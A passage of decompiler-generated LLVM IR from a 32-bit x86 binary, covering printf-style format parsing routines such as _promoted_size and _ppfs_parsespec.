  store i32 %v1_804ee29, i32* %v2_804ede8, align 4
  %v0_804ee2f = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee2f = inttoptr i32 %v0_804ee2f to double*
  %v2_804ee2f = load double, double* %v1_804ee2f, align 4
  %v2_804ee31 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804ee31 = inttoptr i32 %v2_804ee31 to double*
  store double %v2_804ee2f, double* %v4_804ee31, align 4
  br label %dec_label_pc_804ee4e

dec_label_pc_804ee35:                             ; preds = %dec_label_pc_804ee0b
  %v3_804ee35 = load i32, i32* %v2_804ede8, align 4
  store i32 %v3_804ee35, i32* %edx.global-to-local, align 4
  %v1_804ee38 = add i32 %v3_804ee35, 12
  store i32 %v1_804ee38, i32* %eax.global-to-local, align 4
  store i32 %v1_804ee38, i32* %v2_804ede8, align 4
  %v0_804ee3e = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee3e = inttoptr i32 %v0_804ee3e to x86_fp80*
  %v2_804ee3e = load x86_fp80, x86_fp80* %v1_804ee3e, align 4
  %v2_804ee40 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804ee40 = inttoptr i32 %v2_804ee40 to x86_fp80*
  store x86_fp80 %v2_804ee3e, x86_fp80* %v3_804ee40, align 4
  br label %dec_label_pc_804ee4e

dec_label_pc_804ee44:                             ; preds = %dec_label_pc_804eded, %dec_label_pc_804edfb, %dec_label_pc_804ee0b
  %v1_804ee44 = add i32 %v3_804ede8, 4
  store i32 %v1_804ee44, i32* %eax.global-to-local, align 4
  store i32 %v1_804ee44, i32* %v2_804ede8, align 4
  %v0_804ee4a = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee4a = inttoptr i32 %v0_804ee4a to i32*
  %v2_804ee4a = load i32, i32* %v1_804ee4a, align 4
  store i32 %v2_804ee4a, i32* %eax.global-to-local, align 4
  %v1_804ee4c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ee4c = inttoptr i32 %v1_804ee4c to i32*
  store i32 %v2_804ee4a, i32* %v2_804ee4c, align 4
  br label %dec_label_pc_804ee4e

dec_label_pc_804ee4e:                             ; preds = %dec_label_pc_804ee35, %dec_label_pc_804ee26, %dec_label_pc_804ee14, %dec_label_pc_804ee44
  %v0_804ee4e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ee4e = add i32 %v0_804ee4e, 12
  store i32 %v1_804ee4e, i32* %ebx.global-to-local, align 4
  %v0_804ee51.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804ee52.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ee51

dec_label_pc_804ee51:                             ; preds = %dec_label_pc_804eddf, %dec_label_pc_804ee4e
  %v1_804ee52 = phi i32 [ %v1_804ee5222, %dec_label_pc_804eddf ], [ %v1_804ee52.pre, %dec_label_pc_804ee4e ]
  %v0_804ee51 = phi i32 [ %v1_804eddf21, %dec_label_pc_804eddf ], [ %v0_804ee51.pre, %dec_label_pc_804ee4e ]
  %v1_804ee51 = add i32 %v0_804ee51, 1
  store i32 %v1_804ee51, i32* %esi.global-to-local, align 4
  %v2_804ee52 = add i32 %v1_804ee52, 28
  %v3_804ee52 = inttoptr i32 %v2_804ee52 to i32*
  %v4_804ee52 = load i32, i32* %v3_804ee52, align 4
  %v5_804ee55 = icmp slt i32 %v1_804ee51, %v4_804ee52
  br i1 %v5_804ee55, label %dec_label_pc_804eddf, label %dec_label_pc_804ee52.dec_label_pc_804ee87.loopexit_crit_edge

dec_label_pc_804ee59:                             ; preds = %entry
  br i1 %v1_804ee60, label %dec_label_pc_804ee70, label %dec_label_pc_804ee62

dec_label_pc_804ee62:                             ; preds = %dec_label_pc_804ee59
  %v1_804ee62 = add i32 %arg1, 36
  %v2_804ee62 = inttoptr i32 %v1_804ee62 to i8*
  %v3_804ee62 = load i8, i8* %v2_804ee62, align 1
  %v2_804ee66 = zext i8 %v3_804ee62 to i32
  %v3_804ee66 = mul nuw nsw i32 %v2_804ee66, 12
  store i32 %v3_804ee66, i32* %eax.global-to-local, align 4
  %v2_804ee69 = add i32 %arg1, 68
  %v3_804ee69 = add i32 %v2_804ee69, %v3_804ee66
  %v4_804ee69 = inttoptr i32 %v3_804ee69 to i32*
  %v5_804ee69 = load i32, i32* %v4_804ee69, align 4
  store i32 %v5_804ee69, i32* %eax.global-to-local, align 4
  store i32 %v5_804ee69, i32* %v2_804ee59, align 4
  %v0_804ee70.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ee70

dec_label_pc_804ee70:                             ; preds = %dec_label_pc_804ee59, %dec_label_pc_804ee62
  %v1_804ee84 = phi i32 [ %arg1, %dec_label_pc_804ee59 ], [ %v0_804ee70.pre, %dec_label_pc_804ee62 ]
  %v1_804ee70 = add i32 %v1_804ee84, 4
  %v2_804ee70 = inttoptr i32 %v1_804ee70 to i32*
  %v3_804ee70 = load i32, i32* %v2_804ee70, align 4
  %v8_804ee70 = icmp eq i32 %v3_804ee70, -2147483648
  %v1_804ee77 = icmp eq i1 %v8_804ee70, false
  br i1 %v1_804ee77, label %dec_label_pc_804ee87, label %dec_label_pc_804ee79

dec_label_pc_804ee79:                             ; preds = %dec_label_pc_804ee70
  %v1_804ee79 = add i32 %v1_804ee84, 37
  %v2_804ee79 = inttoptr i32 %v1_804ee79 to i8*
  %v3_804ee79 = load i8, i8* %v2_804ee79, align 1
  %v2_804ee7d = zext i8 %v3_804ee79 to i32
  %v3_804ee7d = mul nuw nsw i32 %v2_804ee7d, 12
  store i32 %v3_804ee7d, i32* %eax.global-to-local, align 4
  %v1_804ee80 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ee80 = add nsw i32 %v3_804ee7d, -12
  %v3_804ee80 = add i32 %v2_804ee80, %v1_804ee80
  %v4_804ee80 = inttoptr i32 %v3_804ee80 to i32*
  %v5_804ee80 = load i32, i32* %v4_804ee80, align 4
  store i32 %v5_804ee80, i32* %eax.global-to-local, align 4
  store i32 %v5_804ee80, i32* %v2_804ee70, align 4
  %v0_804ee87.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ee87

dec_label_pc_804ee52.dec_label_pc_804ee87.loopexit_crit_edge: ; preds = %dec_label_pc_804ee51
  br label %dec_label_pc_804ee87.loopexit

dec_label_pc_804ee87.loopexit:                    ; preds = %dec_label_pc_804ee52.dec_label_pc_804ee87.loopexit_crit_edge, %dec_label_pc_804eddb
  %v1_804ee52.lcssa = phi i32 [ %v1_804ee52, %dec_label_pc_804ee52.dec_label_pc_804ee87.loopexit_crit_edge ], [ %v1_804ee5215, %dec_label_pc_804eddb ]
  br label %dec_label_pc_804ee87

dec_label_pc_804ee87:                             ; preds = %dec_label_pc_804ee87.loopexit, %dec_label_pc_804ee70, %dec_label_pc_804ee79
  %v10_804ee8e = phi i32 [ %v1_804ee52.lcssa, %dec_label_pc_804ee87.loopexit ], [ %v1_804ee84, %dec_label_pc_804ee70 ], [ %v0_804ee87.pre, %dec_label_pc_804ee79 ]
  %v1_804ee87 = add i32 %v10_804ee8e, 8
  %v2_804ee87 = inttoptr i32 %v1_804ee87 to i32*
  %v3_804ee87 = load i32, i32* %v2_804ee87, align 4
  store i32 %v3_804ee87, i32* %eax.global-to-local, align 4
  %v2_804ee8a = icmp slt i32 %v3_804ee87, 0
  %v1_804ee8c = icmp eq i1 %v2_804ee8a, false
  br i1 %v1_804ee8c, label %dec_label_pc_804eea2, label %dec_label_pc_804ee8e

dec_label_pc_804ee8e:                             ; preds = %dec_label_pc_804ee87
  %v1_804ee8e = add i32 %v10_804ee8e, 16
  %v2_804ee8e = inttoptr i32 %v1_804ee8e to i32*
  %v3_804ee8e = load i32, i32* %v2_804ee8e, align 4
  %v4_804ee8e = or i32 %v3_804ee8e, 8
  store i32 %v4_804ee8e, i32* %v2_804ee8e, align 4
  %v0_804ee92 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ee92 = sub i32 0, %v0_804ee92
  store i32 %v1_804ee92, i32* %eax.global-to-local, align 4
  %v1_804ee94 = load i32, i32* @ecx, align 4
  %v2_804ee94 = add i32 %v1_804ee94, 8
  %v3_804ee94 = inttoptr i32 %v2_804ee94 to i32*
  store i32 %v1_804ee92, i32* %v3_804ee94, align 4
  %v0_804ee97 = load i32, i32* @ecx, align 4
  %v1_804ee97 = add i32 %v0_804ee97, 16
  %v2_804ee97 = inttoptr i32 %v1_804ee97 to i32*
  %v3_804ee97 = load i32, i32* %v2_804ee97, align 4
  %v4_804ee97 = and i32 %v3_804ee97, -2
  store i32 %v4_804ee97, i32* %v2_804ee97, align 4
  %v0_804ee9b = load i32, i32* @ecx, align 4
  %v1_804ee9b = add i32 %v0_804ee9b, 20
  %v2_804ee9b = inttoptr i32 %v1_804ee9b to i32*
  store i32 32, i32* %v2_804ee9b, align 4
  %v0_804eea4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eea2

dec_label_pc_804eea2:                             ; preds = %dec_label_pc_804ee87, %dec_label_pc_804ee8e
  %v0_804eea4 = phi i32 [ %v3_804ee87, %dec_label_pc_804ee87 ], [ %v0_804eea4.pre, %dec_label_pc_804ee8e ]
  %v2_804eea2 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804eea2, i32* @ebx, align 4
  ret i32 %v0_804eea4

; uselistorder directives
  uselistorder i32 %v3_804ee7d, { 1, 0 }
  uselistorder i32 %v3_804ee66, { 1, 0 }
  uselistorder i32 %v1_804ee51, { 2, 1, 0 }
  uselistorder i32 %v1_804ee52, { 1, 2, 0 }
  uselistorder i32 %v3_804ede8, { 1, 0, 2 }
  uselistorder i32* %v2_804ede8, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804ede3, { 1, 0 }
  uselistorder i32 %v6_804eddf, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804eddf21, { 1, 0 }
  uselistorder i32 %v1_804ee5215, { 2, 0, 1 }
  uselistorder i1 %v1_804ee60, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_804eea2, { 1, 0 }
  uselistorder label %dec_label_pc_804ee87, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ee70, { 1, 0 }
  uselistorder label %dec_label_pc_804ee51, { 1, 0 }
  uselistorder label %dec_label_pc_804ee4e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ee44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804eddf, { 1, 0 }
  uselistorder label %dec_label_pc_804eddb, { 1, 0 }
  uselistorder label %dec_label_pc_804edc1, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804eea8 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804eeaf

dec_label_pc_804eeaf:                             ; preds = %dec_label_pc_804eeaf, %entry
  %v0_804eeaf = phi i32 [ ptrtoint (i8** @global_var_80573ca.168 to i32), %entry ], [ %v1_804eeaf, %dec_label_pc_804eeaf ]
  %v1_804eeaf = add i32 %v0_804eeaf, -2
  %v1_804eeb2 = inttoptr i32 %v1_804eeaf to i16*
  %v2_804eeb2 = load i16, i16* %v1_804eeb2, align 2
  %v3_804eeb2 = sext i16 %v2_804eeb2 to i32
  %v12_804eeb5 = icmp ne i32 %v3_804eeb2, %v0_804eea8
  %v6_804eebf = icmp ugt i32 %v1_804eeaf, ptrtoint (i32* @global_var_80573b2.169 to i32)
  %or.cond = and i1 %v6_804eebf, %v12_804eeb5
  br i1 %or.cond, label %dec_label_pc_804eeaf, label %dec_label_pc_804eec1

dec_label_pc_804eec1:                             ; preds = %dec_label_pc_804eeaf
  %.pre = add i32 %v0_804eeaf, -134575028
  %v2_804eec7 = sdiv i32 %.pre, 2
  store i32 %v2_804eec7, i32* @edx, align 4
  %v1_804eec9 = add i32 %v2_804eec7, ptrtoint (i8** @global_var_80573ca.168 to i32)
  %v2_804eec9 = inttoptr i32 %v1_804eec9 to i8*
  %v3_804eec9 = load i8, i8* %v2_804eec9, align 1
  %v4_804eec9 = zext i8 %v3_804eec9 to i32
  ret i32 %v4_804eec9

; uselistorder directives
  uselistorder i32 %v2_804eec7, { 1, 0 }
  uselistorder i32 %v1_804eeaf, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80573ca.168 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804eed2 = load i32, i32* @edi, align 4
  %v0_804eed3 = load i32, i32* @esi, align 4
  %v0_804eed4 = load i32, i32* @ebx, align 4
  store i32 %v0_804eed4, i32* %stack_var_-16, align 4
  %v4_804eed4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ef00 = add i32 %tmp76, 24
  %v2_804ef00 = inttoptr i32 %v1_804ef00 to i32*
  %v3_804ef00 = load i32, i32* %v2_804ef00, align 4
  store i32 %v3_804ef00, i32* %eax.global-to-local, align 4
  %v1_804ef07 = add i32 %tmp76, 16
  %v2_804ef07 = inttoptr i32 %v1_804ef07 to i32*
  %v3_804ef07 = load i32, i32* %v2_804ef07, align 4
  %v1_804ef0a = and i32 %v3_804ef07, 128
  %v2_804ef0a = icmp eq i32 %v1_804ef0a, 0
  store i32 %v1_804ef0a, i32* %edi.global-to-local, align 4
  %v1_804ef10 = icmp eq i1 %v2_804ef0a, false
  br i1 %v1_804ef10, label %dec_label_pc_804ef23, label %dec_label_pc_804ef12

dec_label_pc_804ef12:                             ; preds = %entry
  %v2_804ef12 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804ef70.outer

dec_label_pc_804ef1d:                             ; preds = %dec_label_pc_804f0ab
  %v1_804ef1d = add i32 %v0_804f0ab.pre.pre, 1
  store i32 %v1_804ef1d, i32* @esi, align 4
  br label %dec_label_pc_804f0bb

dec_label_pc_804ef23:                             ; preds = %entry
  %v15_804eed5 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ef25

dec_label_pc_804ef25:                             ; preds = %dec_label_pc_804ef4d.dec_label_pc_804ef25_crit_edge, %dec_label_pc_804ef23
  %v2_804ef36 = phi i32 [ %v2_804ef36.pre, %dec_label_pc_804ef4d.dec_label_pc_804ef25_crit_edge ], [ %v15_804eed5, %dec_label_pc_804ef23 ]
  %v3_804ef36 = phi i32 [ %v1_804ef4d, %dec_label_pc_804ef4d.dec_label_pc_804ef25_crit_edge ], [ 0, %dec_label_pc_804ef23 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ef29 = mul i32 %v3_804ef36, 4
  store i32 %v1_804ef29, i32* @ecx, align 4
  %v2_804ef30 = load i32, i32* %arg1, align 4
  store i32 %v2_804ef30, i32* @edx, align 4
  %v2_804ef32 = add i32 %v1_804ef29, -4
  %v3_804ef32 = add i32 %v2_804ef32, %v2_804ef30
  %v4_804ef32 = inttoptr i32 %v3_804ef32 to i32*
  %v5_804ef32 = load i32, i32* %v4_804ef32, align 4
  store i32 %v5_804ef32, i32* %eax.global-to-local, align 4
  %v1_804ef36 = trunc i32 %v5_804ef32 to i8
  %v4_804ef36 = add i32 %v2_804ef36, 36
  %v5_804ef36 = add i32 %v4_804ef36, %v3_804ef36
  %v6_804ef36 = inttoptr i32 %v5_804ef36 to i8*
  store i8 %v1_804ef36, i8* %v6_804ef36, align 1
  %v0_804ef3a = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef3a = urem i32 %v0_804ef3a, 256
  %v2_804ef3a = load i32, i32* @ebx, align 4
  %v3_804ef3a = and i32 %v2_804ef3a, -256
  %v4_804ef3a = or i32 %v3_804ef3a, %v1_804ef3a
  store i32 %v4_804ef3a, i32* @ebx, align 4
  %v1_804ef3c = mul i32 %v0_804ef3a, 16777216
  %v2_804ef3c = sdiv i32 %v1_804ef3c, 16777216
  store i32 %v2_804ef3c, i32* %eax.global-to-local, align 4
  %v1_804ef3f = load i32, i32* @edx, align 4
  %v2_804ef3f = load i32, i32* @ecx, align 4
  %v3_804ef3f = add i32 %v1_804ef3f, -4
  %v4_804ef3f = add i32 %v3_804ef3f, %v2_804ef3f
  %v5_804ef3f = inttoptr i32 %v4_804ef3f to i32*
  %v6_804ef3f = load i32, i32* %v5_804ef3f, align 4
  %v17_804ef3f = icmp eq i32 %v2_804ef3c, %v6_804ef3f
  %v1_804ef43 = icmp eq i1 %v17_804ef3f, false
  br i1 %v1_804ef43, label %dec_label_pc_804f295, label %dec_label_pc_804ef49

dec_label_pc_804ef49:                             ; preds = %dec_label_pc_804ef25
  %v3_804ef49 = trunc i32 %v0_804ef3a to i8
  %v4_804ef49 = icmp eq i8 %v3_804ef49, 0
  br i1 %v4_804ef49, label %dec_label_pc_804ef53, label %dec_label_pc_804ef4d

dec_label_pc_804ef4d:                             ; preds = %dec_label_pc_804ef49
  %v0_804ef4d = load i32, i32* %esi.global-to-local, align 4
  %v1_804ef4d = add i32 %v0_804ef4d, 1
  store i32 %v1_804ef4d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804ef4d, 32
  br i1 %tmp, label %dec_label_pc_804ef4d.dec_label_pc_804ef25_crit_edge, label %dec_label_pc_804ef53

dec_label_pc_804ef4d.dec_label_pc_804ef25_crit_edge: ; preds = %dec_label_pc_804ef4d
  %v2_804ef36.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ef25

dec_label_pc_804ef53:                             ; preds = %dec_label_pc_804ef4d, %dec_label_pc_804ef49
  %v2_804ef58 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804ef70.outer

dec_label_pc_804ef70.outer:                       ; preds = %dec_label_pc_804ef53, %dec_label_pc_804ef12, %dec_label_pc_804f08d
  %v0_804ef7c.ph94 = phi i32 [ %v1_804f08d, %dec_label_pc_804f08d ], [ %v2_804ef12, %dec_label_pc_804ef12 ], [ %v2_804ef58, %dec_label_pc_804ef53 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804f08d ], [ %tmp66, %dec_label_pc_804ef12 ], [ %tmp66, %dec_label_pc_804ef53 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804ef16, %dec_label_pc_804f08d ], [ 0, %dec_label_pc_804ef12 ], [ 0, %dec_label_pc_804ef53 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f08d ], [ %v3_804ef00, %dec_label_pc_804ef12 ], [ %v3_804ef00, %dec_label_pc_804ef53 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804f08d ], [ 0, %dec_label_pc_804ef12 ], [ 0, %dec_label_pc_804ef53 ]
  %v7_804ef77 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804ef77 = trunc i64 %v7_804ef77 to i32
  %v2_804ef7f = add i32 %v8_804ef77, 80
  br label %dec_label_pc_804ef70

dec_label_pc_804ef70:                             ; preds = %dec_label_pc_804ef70.outer, %dec_label_pc_804f02d
  %v0_804ef7c = phi i32 [ %v0_804f03a, %dec_label_pc_804f02d ], [ %v0_804ef7c.ph94, %dec_label_pc_804ef70.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804f02d ], [ %stack_var_-32.1.ph, %dec_label_pc_804ef70.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804f02d ], [ %stack_var_-88.1.ph, %dec_label_pc_804ef70.outer ]
  store i32 %v0_804ef7c, i32* @edx, align 4
  %v1_804ef70 = inttoptr i32 %v0_804ef7c to i8*
  %v2_804ef70 = load i8, i8* %v1_804ef70, align 1
  %v11_804ef70 = icmp eq i8 %v2_804ef70, 42
  store i32 %v0_804ef7c, i32* @esi, align 4
  %v1_804ef75 = icmp eq i1 %v11_804ef70, false
  br i1 %v1_804ef75, label %dec_label_pc_804ef87, label %dec_label_pc_804ef77

dec_label_pc_804ef77:                             ; preds = %dec_label_pc_804ef70
  store i32 %v8_804ef77, i32* %eax.global-to-local, align 4
  %v1_804ef7c = add i32 %v0_804ef7c, 1
  store i32 %v1_804ef7c, i32* @esi, align 4
  %v0_804ef7f = load i32, i32* @esp, align 4
  %v3_804ef7f = add i32 %v2_804ef7f, %v0_804ef7f
  %v4_804ef7f = inttoptr i32 %v3_804ef7f to i32*
  store i32 0, i32* %v4_804ef7f, align 4
  %v0_804efa1.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ef87

dec_label_pc_804ef87:                             ; preds = %dec_label_pc_804ef70, %dec_label_pc_804ef77
  %v0_804efa1.pre = phi i32 [ %v0_804ef7c, %dec_label_pc_804ef70 ], [ %v0_804efa1.pre.pre, %dec_label_pc_804ef77 ]
  %v0_804ef87 = load i32, i32* @global_var_805a438, align 8
  store i32 %v0_804ef87, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804efa1.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804efa1

dec_label_pc_804ef91:                             ; preds = %dec_label_pc_804efa1
  %v1_804ef91 = add i32 %v1_804ef99, -4094
  %v6_804ef91 = sub i32 4093, %v1_804ef99
  %v7_804ef91 = and i32 %v6_804ef91, %v1_804ef99
  %v8_804ef91 = icmp slt i32 %v7_804ef91, 0
  %v9_804ef91 = icmp eq i32 %v1_804ef91, 0
  %v10_804ef91 = icmp slt i32 %v1_804ef91, 0
  %v3_804ef97 = icmp eq i1 %v10_804ef91, %v8_804ef91
  %v4_804ef97 = icmp eq i1 %v9_804ef91, false
  %v5_804ef97 = and i1 %v4_804ef97, %v3_804ef97
  br i1 %v5_804ef97, label %dec_label_pc_804efa0, label %dec_label_pc_804ef99

dec_label_pc_804ef99:                             ; preds = %dec_label_pc_804ef91
  %v3_804ef99 = mul i32 %v1_804ef99, 10
  store i32 %v3_804ef99, i32* %eax.global-to-local, align 4
  %v2_804ef9c = add i32 %v3_804ef99, -48
  %v3_804ef9c = add i32 %v2_804ef9c, %v2_804efa3
  store i32 %v3_804ef9c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804efa0

dec_label_pc_804efa0:                             ; preds = %dec_label_pc_804ef91, %dec_label_pc_804ef99
  %v0_804efbb32 = phi i32 [ %v1_804ef99, %dec_label_pc_804ef91 ], [ %v3_804ef9c, %dec_label_pc_804ef99 ]
  %v4_804efa128 = phi i32 [ %v6_804efa1, %dec_label_pc_804ef91 ], [ %v3_804ef99, %dec_label_pc_804ef99 ]
  %v1_804efa0 = add i32 %v0_804efa0, 1
  store i32 %v1_804efa0, i32* @esi, align 4
  br label %dec_label_pc_804efa1

dec_label_pc_804efa1:                             ; preds = %dec_label_pc_804ef87, %dec_label_pc_804efa0
  %v1_804ef99 = phi i32 [ 0, %dec_label_pc_804ef87 ], [ %v0_804efbb32, %dec_label_pc_804efa0 ]
  %v4_804efa1 = phi i32 [ %v4_804efa1.pre, %dec_label_pc_804ef87 ], [ %v4_804efa128, %dec_label_pc_804efa0 ]
  %v0_804efa0 = phi i32 [ %v0_804efa1.pre, %dec_label_pc_804ef87 ], [ %v1_804efa0, %dec_label_pc_804efa0 ]
  %v1_804efa1 = inttoptr i32 %v0_804efa0 to i8*
  %v2_804efa1 = load i8, i8* %v1_804efa1, align 1
  %v3_804efa1 = zext i8 %v2_804efa1 to i32
  %v5_804efa1 = and i32 %v4_804efa1, -256
  %v6_804efa1 = or i32 %v3_804efa1, %v5_804efa1
  store i32 %v6_804efa1, i32* %eax.global-to-local, align 4
  %v2_804efa3 = sext i8 %v2_804efa1 to i32
  store i32 %v2_804efa3, i32* @ecx, align 4
  %v2_804efa6 = mul nsw i32 %v2_804efa3, 2
  %v3_804efa6 = add i32 %v2_804efa6, %v0_804ef87
  %v4_804efa6 = inttoptr i32 %v3_804efa6 to i8*
  %v5_804efa6 = load i8, i8* %v4_804efa6, align 1
  %v6_804efa6 = and i8 %v5_804efa6, 8
  %v7_804efa6 = icmp eq i8 %v6_804efa6, 0
  %v1_804efab = icmp eq i1 %v7_804efa6, false
  br i1 %v1_804efab, label %dec_label_pc_804ef91, label %dec_label_pc_804efad

dec_label_pc_804efad:                             ; preds = %dec_label_pc_804efa1
  %v0_804efad = load i32, i32* @edx, align 4
  %v1_804efad = add i32 %v0_804efad, -1
  %v2_804efad = inttoptr i32 %v1_804efad to i8*
  %v3_804efad = load i8, i8* %v2_804efad, align 1
  %v12_804efad = icmp eq i8 %v3_804efad, 37
  %v1_804efb1 = icmp eq i1 %v12_804efad, false
  br i1 %v1_804efb1, label %dec_label_pc_804f044, label %dec_label_pc_804efb7

dec_label_pc_804efb7:                             ; preds = %dec_label_pc_804efad
  %v10_804efb7 = icmp eq i8 %v2_804efa1, 36
  %v1_804efb9 = icmp eq i1 %v10_804efb7, false
  br i1 %v1_804efb9, label %dec_label_pc_804efeb, label %dec_label_pc_804efbb

dec_label_pc_804efbb:                             ; preds = %dec_label_pc_804efb7
  %tmp89 = icmp slt i32 %v1_804ef99, 1
  br i1 %tmp89, label %dec_label_pc_804efeb, label %dec_label_pc_804efbf

dec_label_pc_804efbf:                             ; preds = %dec_label_pc_804efbb
  %v4_804efbf = icmp eq i32 %stack_var_-88.1, 0
  %v1_804efc4 = add i32 %v0_804efa0, 1
  store i32 %v1_804efc4, i32* @edx, align 4
  br i1 %v4_804efbf, label %dec_label_pc_804f295, label %dec_label_pc_804efcd

dec_label_pc_804efcd:                             ; preds = %dec_label_pc_804efbf
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804efd5 = sub i32 %v1_804ef99, %stack_var_-88.1
  %v8_804efd5 = xor i32 %v1_804ef99, %stack_var_-88.1
  %v9_804efd5 = xor i32 %v2_804efd5, %v1_804ef99
  %v10_804efd5 = and i32 %v9_804efd5, %v8_804efd5
  %v11_804efd5 = icmp slt i32 %v10_804efd5, 0
  %v12_804efd5 = icmp eq i32 %v2_804efd5, 0
  %v13_804efd5 = icmp slt i32 %v2_804efd5, 0
  %v3_804efd7 = icmp ne i1 %v13_804efd5, %v11_804efd5
  %v4_804efd7 = or i1 %v12_804efd5, %v3_804efd7
  %stack_var_-88.1.v0_804efd9 = select i1 %v4_804efd7, i32 %stack_var_-88.1, i32 %v1_804ef99
  br label %dec_label_pc_804efe7

dec_label_pc_804efe7:                             ; preds = %dec_label_pc_804effb, %dec_label_pc_804efcd, %dec_label_pc_804efff
  %v0_804efe7 = phi i32 [ %v1_804efc4, %dec_label_pc_804efcd ], [ %v0_804efad, %dec_label_pc_804efff ], [ %v0_804efad, %dec_label_pc_804effb ]
  %stack_var_-32.2 = phi i32 [ %v1_804ef99, %dec_label_pc_804efcd ], [ %stack_var_-32.1, %dec_label_pc_804efff ], [ %stack_var_-32.1, %dec_label_pc_804effb ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804efd9, %dec_label_pc_804efcd ], [ 0, %dec_label_pc_804efff ], [ 0, %dec_label_pc_804effb ]
  store i32 %v0_804efe7, i32* @esi, align 4
  br label %dec_label_pc_804f00e

dec_label_pc_804efeb:                             ; preds = %dec_label_pc_804efbb, %dec_label_pc_804efb7
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804effb, label %dec_label_pc_804eff2

dec_label_pc_804eff2:                             ; preds = %dec_label_pc_804efeb
  %v10_804eff2 = icmp eq i8 %v2_804efa1, 109
  br i1 %v10_804eff2, label %dec_label_pc_804f044, label %dec_label_pc_804f295

dec_label_pc_804effb:                             ; preds = %dec_label_pc_804efeb
  %tmp153 = icmp ugt i32 %v0_804efa0, %v0_804efad
  br i1 %tmp153, label %dec_label_pc_804efff, label %dec_label_pc_804efe7

dec_label_pc_804efff:                             ; preds = %dec_label_pc_804effb
  %v1_804efff = inttoptr i32 %v0_804efad to i8*
  %v2_804efff = load i8, i8* %v1_804efff, align 1
  %v8_804efff = icmp eq i8 %v2_804efff, 48
  br i1 %v8_804efff, label %dec_label_pc_804efe7, label %dec_label_pc_804f044

dec_label_pc_804f00e:                             ; preds = %dec_label_pc_804f01f, %dec_label_pc_804efe7
  %v0_804f03a = phi i32 [ %v1_804f01f, %dec_label_pc_804f01f ], [ %v0_804efe7, %dec_label_pc_804efe7 ]
  %v4_804f01835 = phi i32 [ %v6_804f018, %dec_label_pc_804f01f ], [ %v6_804efa1, %dec_label_pc_804efe7 ]
  store i32 ptrtoint ([8 x i8]* @global_var_80573aa.170 to i32), i32* %edx.global-to-local, align 4
  %v1_804f01b = inttoptr i32 %v0_804f03a to i8*
  br label %dec_label_pc_804f018

dec_label_pc_804f018:                             ; preds = %dec_label_pc_804f029, %dec_label_pc_804f00e
